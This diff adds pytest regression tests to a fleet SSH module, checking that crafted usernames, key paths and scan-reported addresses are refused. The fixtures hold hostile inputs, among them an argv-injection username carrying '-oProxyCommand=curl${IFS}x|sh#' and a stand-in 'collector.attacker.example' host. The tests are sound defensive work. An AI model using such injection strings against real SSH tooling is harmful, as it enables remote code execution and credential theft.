@@ -411,3 +411,55 @@ class TestUpdateProgress:
             == "apt-get update"
         assert _step_name(["/usr/local/lib/nmesh/nmesh-update"]) == "nmesh-update"
         assert _step_name([]) == "step"
+
+
+class TestArgvCannotBecomeOptions:
+    """Nothing here goes through a shell — the defect was argv *parsing*.
+    OpenSSH reads a leading `-` as an option and `-o` takes its argument
+    attached, so a field pasted into an argv element decides what ssh does."""
+
+    def test_a_username_that_would_lead_an_argv_element_is_refused(self):
+        # No whitespace, at most 64 characters — it passed the old test, and
+        # ${IFS} supplies the spaces the old test forbade.
+        for bad in ("-oProxyCommand=curl${IFS}x|sh#", "-lroot", "--", "-",
+                    "root;id", "ro ot", "", "x" * 64):
+            with pytest.raises(fleet_ssh.SshError):
+                fleet_ssh.SshCredentials(bad)
+
+    def test_ordinary_account_names_still_work(self):
+        for good in ("root", "nmesh", "ubuntu", "deploy_2", "a.b-c"):
+            assert fleet_ssh.SshCredentials(good).username == good
+
+    def test_a_sudo_username_is_held_to_the_same_rule(self):
+        with pytest.raises(fleet_ssh.SshError):
+            fleet_ssh.SshCredentials("root", sudo_user="-oProxyCommand=x")
+
+    def test_a_key_path_that_would_lead_an_argv_element_is_refused(self):
+        for bad in ("-oProxyCommand=x", "relative/key", "-"):
+            with pytest.raises(fleet_ssh.SshError):
+                fleet_ssh.SshCredentials("root", key_path=bad)
+
+    def test_the_destination_is_passed_as_l_user_host(self):
+        """`user@host` is one argv element whose first character the caller
+        chooses; `-l user host` never is."""
+        creds = fleet_ssh.SshCredentials("root")
+        options = fleet_ssh._base_options(None, creds, 22)
+        assert "@" not in " ".join(options)
+
+
+class TestScanResultsAreAddresses:
+    """The `ip` field decides where a credential goes, and it arrives from a
+    managed node's scan. The label is that node's to choose and is shown beside
+    the address, never instead of it."""
+
+    def test_a_hostname_is_not_a_scan_result(self):
+        from src.apps.fleet import _clean_scan_hosts, _clean_targets
+        hostile = [{"ip": "collector.attacker.example", "label": "192.168.1.42"}]
+        assert _clean_scan_hosts(hostile) == []
+        assert _clean_targets(hostile) == []
+
+    def test_real_addresses_pass(self):
+        from src.apps.fleet import _clean_scan_hosts, _clean_targets
+        good = [{"ip": "192.168.1.42"}, {"ip": "2001:db8::5"}]
+        assert len(_clean_scan_hosts(good)) == 2
+        assert len(_clean_targets(good)) == 2
